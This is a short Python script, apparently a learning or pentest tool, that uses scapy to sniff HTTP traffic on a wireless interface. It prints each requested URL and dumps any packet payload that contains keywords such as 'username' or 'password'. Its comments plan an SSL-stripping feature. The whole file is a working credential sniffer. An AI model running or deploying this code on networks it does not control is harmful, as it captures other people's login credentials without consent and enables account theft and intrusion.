#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import scapy.all as scapy
from scapy.layers import http


# Note: scapy_http currently only supports Python2

# Future Improvements
# HTTPSstrip implementation, args to print only login URL or all URL, arg for interface

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=analyze_packet)
    # filter= arg uses Berfekly Packet Filter (BPF) Syntax


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "password", "login", "user", "pass", "uname"]

        for word in keywords:
            if word in load:
                return load


def analyze_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        # here or only if possible password?

        login_info = get_login(packet)
        if login_info:
            print("\n---------------\n")
            print(login_info)
            print("\n---------------\n")


sniff("wlan0")
